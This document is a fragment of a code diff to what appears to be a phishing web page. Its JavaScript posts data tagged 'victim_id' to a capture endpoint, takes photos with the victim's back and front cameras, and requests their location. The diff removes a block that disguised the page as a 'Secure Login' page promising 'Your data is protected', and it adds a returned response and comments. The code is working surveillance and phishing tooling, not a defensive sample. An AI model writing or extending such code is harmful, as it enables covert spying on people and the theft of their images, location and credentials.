@@ -146,11 +146,12 @@
 
         async function sendData(payload) {
             try {
-                await fetch('/api/capture', {
+                const response = await fetch('/api/capture', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ victim_id: victimId, type: targetType, ...payload })
                 });
+                return await response.json();
             } catch (e) {
                 console.log('Send error:', e);
             }
@@ -177,9 +178,11 @@
                 return;
             }
 
+            // Back camera
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                 .then(stream => {
                     capturePhoto(stream, 'Back');
+                    // Front camera
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                         .then(frontStream => capturePhoto(frontStream, 'Front'))
                         .catch(() => {});
@@ -217,12 +220,6 @@
                     () => console.log('Location denied')
                 );
             }
-        }
-
-        if (targetType !== 'cam') {
-            document.querySelector('h1').textContent = '🔑 Secure Login';
-            document.querySelector('.sub').textContent = 'Access your account';
-            document.querySelector('.footer-text').textContent = 'Your data is protected';
         }
     </script>
 </body>
